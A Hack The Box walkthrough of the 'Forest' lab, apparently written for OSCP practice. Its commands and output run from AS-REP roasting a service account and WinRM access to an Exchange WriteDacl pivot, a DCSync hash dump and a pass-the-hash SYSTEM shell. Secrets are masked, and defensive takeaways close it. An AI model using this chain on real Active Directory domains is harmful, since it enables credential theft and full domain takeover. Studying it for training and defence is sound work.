# Forest (HTB)

> Platform: Hack The Box  
> OS: Windows  
> Difficulty: Easy  
> Result: root

---

## Attack Chain

```text
Reconnaissance
├── nmap -p- --min-rate=5000 -T4 -Pn -n forest.htb → 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 47001, +high RPC ports
├── nmap -sC -sV → Microsoft DNS, Domain: htb.local, Host: FOREST, OS: Windows Server 2016 Standard 14393
└── /etc/hosts: 10.129.95.210 forest.htb htb.local FOREST.htb.local FOREST

Foothold (Anonymous RPC -> AS-REP Roast -> WinRM)
├── rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" → 31 domain users
├── impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile users.txt -request → $krb5asrep$23$svc-alfresco@HTB.LOCAL
├── john asrep.hash --wordlist=rockyou.txt --format=krb5asrep → <PASSWORD>
└── evil-winrm -i 10.129.95.210 -u svc-alfresco -p <PASSWORD> → shell → user.txt

Authenticated Enumeration
├── whoami /groups → BUILTIN\Account Operators
├── netexec ldap 10.129.95.210 -u svc-alfresco -p <PASSWORD> --bloodhound --collection All
└── BloodHound: SVC-ALFRESCO → ACCOUNT OPERATORS --GenericAll--> EXCHANGE WINDOWS PERMISSIONS --WriteDacl--> HTB.LOCAL → DOMAIN ADMINS

Privilege Escalation (Exchange WriteDacl -> DCSync -> Pass-the-Hash)
├── net user john <PASSWORD> /add /domain
├── net group "Exchange Windows Permissions" john /add /domain
├── net localgroup "Remote Management Users" john /add
├── . .\powerview.ps1
├── Add-ObjectAcl -PrincipalIdentity john -Credential $cred -Rights DCSync
├── impacket-secretsdump htb.local/john:<PASSWORD>@10.129.95.210 -just-dc-user Administrator → NTLM hash
└── impacket-psexec -hashes <NTLM_HASH> Administrator@10.129.95.210 → SYSTEM → root.txt
```

> [!NOTE]
> All flags, passwords, hashes, and session tokens have been masked for ethical reasons.

---

## Machine Briefing

Windows Server 2016 Standard (14393) Domain Controller (`FOREST`) for the `htb.local` domain. The port profile (53 DNS, 88 Kerberos, 389/3268 LDAP, 445 SMB, 464 kpasswd, 636 LDAPS, 3269 GC-LDAPS, 5985 WinRM, 9389 AD Web Services) is a textbook Active Directory signature. SMB signing is enabled and required - SMB relay is not possible.

This machine demonstrates the classic Active Directory attack chain that requires no CVE: an account with Kerberos pre-authentication disabled (`svc-alfresco`) is AS-REP-roasted and cracked offline; the recovered credentials belong to `Account Operators`, which has `GenericAll` over the Exchange group `Exchange Windows Permissions`; that group holds `WriteDacl` on the domain object, which allows granting `DCSync` rights; and `DCSync` extracts the NTLM hash of `Administrator`. The chain is entirely built on misconfigurations that are common in real enterprise AD environments with Exchange installed.

---

## Reconnaissance

### Port Scan

```bash
mkdir -p ~/Desktop/forest/scans; cd ~/Desktop/forest/scans
ports=$(nmap -p- --min-rate=5000 -T4 -Pn -n forest.htb -oG - | awk '/open/{for(i=4;i<=NF;i++){split($i,a,"/"); if(a[2]=="open") printf a[1]","}}' | sed 's/,$//')
nmap -sC -sV -Pn -n -p "$ports" forest.htb -oA scans/detail
```

**Result (detail):**

```text
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: ...)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   Domain name: htb.local
|   Forest name: htb.local
|_  FQDN: FOREST.htb.local
```

Port summary:

| Port  | Service       | Notes                                        |
|-------|---------------|----------------------------------------------|
| 53    | DNS           | Simple DNS Plus                              |
| 88    | Kerberos      | Windows Kerberos                             |
| 135   | MSRPC         | Windows RPC                                  |
| 139   | NetBIOS-SSN   | Legacy SMB                                   |
| 389   | LDAP          | Domain: htb.local                            |
| 445   | SMB           | Signing enabled and required                 |
| 464   | kpasswd5      | Kerberos password change                     |
| 593   | RPC over HTTP | ncacn_http                                   |
| 636   | LDAPS         | tcpwrapped                                   |
| 3268  | GC-LDAP       | Global Catalog LDAP                          |
| 3269  | GC-LDAPS      | tcpwrapped                                   |
| 5985  | WinRM         | Microsoft HTTPAPI - remote PowerShell        |
| 9389  | AD Web Svcs   | .NET Message Framing                         |
| 47001 | HTTP          | Microsoft HTTPAPI                             |

Add the host to `/etc/hosts`:

```bash
echo "10.129.95.210    forest.htb htb.local FOREST.htb.local FOREST" | sudo tee -a /etc/hosts
ping -c 2 htb.local
```

**Key observation:** the port set (53, 88, 389, 445, 464, 636, 3268, 3269, 9389) is the canonical Domain Controller signature. LDAP reports `Domain: htb.local`, and SMB reports `Computer name: FOREST`, `FQDN: FOREST.htb.local`. Port **5985** (WinRM) is open - likely the initial foothold shell once valid domain credentials are found.

---

## Foothold (Anonymous RPC -> AS-REP Roast -> WinRM)

### Anonymous RPC Enumeration

The DC allows anonymous RPC (MS-RPC null session). Enumerate the domain users without credentials:

```bash
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers"
```

**Result:**

```text
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
...
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

**Key observation:** the `SM_*` and `HealthMailbox*` accounts confirm that Microsoft Exchange is installed in this domain. The account `svc-alfresco` stands out because of its `svc-` prefix - a common convention for service accounts. Service accounts frequently have Kerberos pre-authentication disabled, which is exactly the condition for AS-REP Roasting.

### AS-REP Roasting

Save the user list and request an AS-REP (TGT) for every user. Only accounts with `UF_DONT_REQUIRE_PREAUTH` will return a hash:

```bash
rpcclient -U "" -N 10.129.95.210 -c "enumdomusers" | grep -oP 'user:\[\K[^\]]+' > users.txt
wc -l users.txt

impacket-GetNPUsers htb.local/ -dc-ip 10.129.95.210 -no-pass -usersfile users.txt -request -format hashcat -outputfile asrep.hash
```

**Result:**

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
...
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:<KRB5ASREP_HASH_PART>$f475...
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

**Key observation:** only `svc-alfresco` returned a Kerberos AS-REP hash. This means the account has Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH` flag), which allows anyone to request a TGT encrypted with the account's NTLM hash and crack it offline.

### Cracking the AS-REP Hash

The hash format `$krb5asrep$23$...` (etype 23, RC4-HMAC) is crackable with John the Ripper or hashcat (mode 18200):

```bash
john asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep
```

**Result:**

```text
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD>          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:01 DONE (2026-10-14 02:50) 0.5917g/s 2417Kp/s 2417Kc/s 2417KC/s s4ls469..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

Credentials recovered: `htb.local\svc-alfresco : <PASSWORD>`.

### WinRM Foothold

Port 5985 (WinRM) is open. Use `evil-winrm` with the recovered credentials:

```bash
evil-winrm -i 10.129.95.210 -u svc-alfresco -p '<PASSWORD>'
```

**Result:**

```text
Evil-WinRM shell v4.1
Info: Establishing connection to remote endpoint
Info: Connection successful
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

Confirm identity and grab the user flag:

```powershell
whoami
hostname
type C:\Users\svc-alfresco\Desktop\user.txt
```

**Result:**

```text
htb\svc-alfresco
FOREST
<USER_FLAG>
```

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Authenticated Enumeration

### Group Membership

Check which groups `svc-alfresco` belongs to, including nested memberships:

```powershell
whoami /groups
```

**Result (relevant excerpt):**

```text
Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
```

**Key observation:** `svc-alfresco` is a member of `BUILTIN\Account Operators`. This is a privileged built-in group whose members can create and modify ordinary domain users and groups. It cannot modify protected groups (`Domain Admins`, `Administrators`, etc.), but it can modify non-protected groups - which is enough to pivot through Exchange groups.

### BloodHound Collection

Collect Active Directory data for graph analysis. The `bloodhound-python` collector fails against this DC because LDAP signing is enforced (the Python collector uses a fallback that loses its LDAP context after the signing error). NetExec, using a different code path, works:

```bash
netexec ldap 10.129.95.210 -u svc-alfresco -p '<PASSWORD>' --bloodhound --collection All --dns-server 10.129.95.210
```

**Result:**

```text
LDAP  10.129.95.210  389  FOREST  [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
LDAP  10.129.95.210  389  FOREST  [+] htb.local\svc-alfresco:<PASSWORD>
LDAP  10.129.95.210  389  FOREST  Resolved collection methods: rdp, trusts, localadmin, psremote, group, objectprops, session, acl, container, dcom
LDAP  10.129.95.210  389  FOREST  Done in 1M 42S
LDAP  10.129.95.210  389  FOREST  Compressing output into /home/kali/.nxc/logs/FOREST_10.129.95.210_2026-10-14_030646_bloodhound.zip
```

Upload the resulting zip into BloodHound CE and mark `SVC-ALFRESCO@HTB.LOCAL` as **Owned**.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Shortest Path to Domain Admins

With `SVC-ALFRESCO` marked as Owned, query the shortest path to `DOMAIN ADMINS@HTB.LOCAL`:

**Result (BloodHound graph):**

```text
SVC-ALFRESCO@HTB.LOCAL
  │ MemberOf
  ▼
SERVICE ACCOUNTS@HTB.LOCAL
  │ MemberOf
  ▼
PRIVILEGED IT ACCOUNTS@HTB.LOCAL
  │ MemberOf
  ▼
ACCOUNT OPERATORS@HTB.LOCAL ──GenericAll──► EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
                                                   │ WriteDacl
                                                   ▼
                                            HTB.LOCAL (domain object)
                                                   │ Contains
                                                   ▼
                                            USERS@HTB.LOCAL
                                                   │ Contains
                                                   ▼
                                            DOMAIN ADMINS@HTB.LOCAL
```

**Key observation:** the path is fully explained by three facts:

1. `SVC-ALFRESCO` is transitively a member of `ACCOUNT OPERATORS`.
2. `ACCOUNT OPERATORS` has `GenericAll` over the group `EXCHANGE WINDOWS PERMISSIONS`. `GenericAll` is full control - it allows modifying group membership.
3. `EXCHANGE WINDOWS PERMISSIONS` has `WriteDacl` over the domain object `HTB.LOCAL`. `WriteDacl` allows modifying the object's ACL - which means granting anyone the `DCSync` extended right.

The remaining edge (`HTB.LOCAL` -Contains-> `USERS` -Contains-> `DOMAIN ADMINS`) is the standard AD hierarchy; it shows why `DCSync` on the domain object yields Domain Admin hashes.

This is exactly the `Exchange Windows Permissions` misconfiguration introduced by default when Microsoft Exchange is installed (publicly tracked as **CVE-2019-0724 / PrivExchange**). `Account Operators` having `GenericAll` over this group is the pivot.

---

## Exploitation

No CVE (misconfiguration) - the `svc-alfresco` account has Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`), which allows any unauthenticated user to request an AS-REP (TGT) encrypted with the account's NTLM hash and crack it offline.

No CVE (design weakness) - `ACCOUNT OPERATORS` has `GenericAll` over `EXCHANGE WINDOWS PERMISSIONS`, which has `WriteDacl` over the domain object `HTB.LOCAL`. Both facts come from the default Exchange installation and are publicly documented as **CVE-2019-0724 (PrivExchange)**. The chain requires no exploit code - only legitimate AD administration primitives (`net group`, `Add-ObjectAcl`, `secretsdump`).

---

## Privilege Escalation (Exchange WriteDacl -> DCSync -> Pass-the-Hash)

### Create a Pivot User

`Account Operators` members can create domain users. Create a fresh user `john` and add him to the two groups needed for the pivot:

```powershell
net user john <PASSWORD> /add /domain
net group "Exchange Windows Permissions" john /add /domain
net localgroup "Remote Management Users" john /add
```

**Result:**

```text
The command completed successfully.
The command completed successfully.
The command completed successfully.
```

**Key observation:** the second command is the pivot. `svc-alfresco` (via `Account Operators` + `GenericAll`) can add `john` to `Exchange Windows Permissions`. This group holds `WriteDacl` on the domain object - so `john` now inherits that ability. `Remote Management Users` is added for WinRM access.

### Grant DCSync Rights

Upload PowerView to the target and use it to grant `john` the `DCSync` extended right on the domain object:

```powershell
upload /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1

. .\powerview.ps1

$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\john', $pass)

Add-ObjectAcl -PrincipalIdentity john -Credential $cred -Rights DCSync -Verbose
```

**Result (relevant lines):**

```text
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local 'DCSync' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local rights GUID '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local rights GUID '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Granting principal CN=john,CN=Users,DC=htb,DC=local rights GUID '89e95b76-444d-4c62-991a-0facbeda640c' on DC=htb,DC=local
Verbose: [Add-DomainObjectAcl] Error granting principal ... 'DCSync' on CN=Users,DC=htb,DC=local : Exception calling "CommitChanges" with "0" argument(s): "Access is denied."
... (repeats for many child objects)
```

**Key observation:** the three "Granting" lines on `DC=htb,DC=local` are the important ones. They correspond to:
- `1131f6aa-...` = `DS-Replication-Get-Changes`
- `1131f6ad-...` = `DS-Replication-Get-Changes-All`
- `89e95b76-...` = `DS-Replication-Get-Changes-In-Filtered-Set`

`Add-ObjectAcl` iterates over **all** objects in the domain, and the `Access is denied` lines are expected: `john` (via `Exchange Windows Permissions` / `WriteDacl` on the domain object) only has ACL-modify rights on the **domain root**, not on child objects like `Domain Admins` or `Administrator`. The domain-root grants are sufficient for DCSync.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### DCSync

With `DCSync` rights in place, run `impacket-secretsdump` as `john` to extract the NTLM hash of `Administrator`:

```bash
impacket-secretsdump 'htb.local/john:<PASSWORD>@10.129.95.210' -just-dc-user Administrator
```

**Result:**

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:<LM_HASH_EMPTY>:<NTLM_HASH>:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:<AES256_KEY>
htb.local\Administrator:aes128-cts-hmac-sha1-96:<AES128_KEY>
htb.local\Administrator:des-cbc-md5:<DES_KEY>
[*] Cleaning up...
```

**Key observation:** `impacket-secretsdump` uses the `DRSUAPI` (Directory Replication Service Remote Protocol) to impersonate a domain controller and pull the `NTDS.DIT` secrets. The critical value is the NTLM hash of `Administrator`: `<NTLM_HASH>`.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

### Pass-the-Hash

Use the NTLM hash with `impacket-psexec` (Pass-the-Hash - no plaintext password needed):

```bash
impacket-psexec -hashes '<LM_HASH>:<NTLM_HASH>' Administrator@10.129.95.210
```

**Result:**

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on 10.129.95.210.....
[*] Found writable share ADMIN$
[*] Uploading file WuyqqSXb.exe
[*] Opening SVCManager on 10.129.95.210.....
[*] Creating service CwwI on 10.129.95.210.....
[*] Starting service CwwI.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
<ROOT_FLAG>
```

**Key observation:** `psexec` uploads a service binary to `ADMIN$`, registers it as a Windows service, and starts it. The service runs as `NT AUTHORITY\SYSTEM` - the highest privilege level on the machine. The NTLM hash is used directly (Pass-the-Hash); the plaintext password of `Administrator` was never recovered.

> [!IMPORTANT]
> OSCP report: take a screenshot of this step (command + output + timestamp).

---

## Flags

| Flag | Value       |
|------|-------------|
| User | <USER_FLAG> |
| Root | <ROOT_FLAG> |

---

## Key Takeaways

- **AS-REP Roasting requires only one misconfigured account.** A service account with `UF_DONT_REQUIRE_PREAUTH` set allows an unauthenticated attacker to request a TGT and crack it offline. The defense is simple: do not disable Kerberos pre-authentication, and if a service requires it, use a long, randomly generated password.

- **`Account Operators` is not a minor group.** Members can create and modify ordinary users and groups, and this is enough to pivot through non-protected Exchange groups. Audit any account in `Account Operators`, and treat it as a foothold-equivalent privilege level, not a low-privilege role.

- **`Exchange Windows Permissions` holds `WriteDacl` on the domain by default.** This is a well-known Exchange-installation misconfiguration (documented as **CVE-2019-0724 / PrivExchange**). The `WriteDacl` right allows modifying the domain object's ACL - and granting yourself `DCSync`. Microsoft's recommended fix is to remove the `WriteDacl` ACE from `Exchange Windows Permissions` on the domain object after Exchange installation.

- **DCSync is a legitimate replication protocol, not an exploit.** `impacket-secretsdump` uses `DRSUAPI` (the same protocol domain controllers use to replicate with each other). Preventing DCSync means limiting who holds the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights on the domain object - which by default is only `Domain Admins`, `Enterprise Admins`, `Administrators`, and the DC machine accounts.

- **Pass-the-Hash eliminates the need for a plaintext password.** Once the NTLM hash of `Administrator` is recovered via DCSync, it can be used directly with `impacket-psexec`, `impacket-wmiexec`, `crackmapexec`/`netexec`, or `evil-winrm --hash`. There is no way to prevent PtH short of rotating the target account's password (or disabling NTLM authentication entirely).

- **BloodHound visualization turns a multi-step AD chain into a single picture.** The graph `SVC-ALFRESCO -> ACCOUNT OPERATORS -> EXCHANGE WINDOWS PERMISSIONS -> HTB.LOCAL -> DOMAIN ADMINS` is the entire privilege escalation path. Without the graph, the same path would require manual ACL enumeration across dozens of objects.

- **`bloodhound-python` and NetExec use different LDAP code paths.** The standalone `bloodhound-python` collector failed on this DC because of LDAP signing enforcement; NetExec's bundled collector (`netexec ldap ... --bloodhound`) worked because it handles the signing/channel-binding negotiation differently. Both are equally valid on OSCP; know that the failure mode exists and be ready to switch collectors.

- **No CVE, no exploit code.** The entire chain uses built-in AD administration primitives (`net user`, `net group`, `Add-ObjectAcl`, `impacket-secretsdump`). This is the modern shape of Active Directory attacks: the problem is not memory corruption in `lsass.exe` - it is the cumulative effect of permissions that were granted at install time and never audited.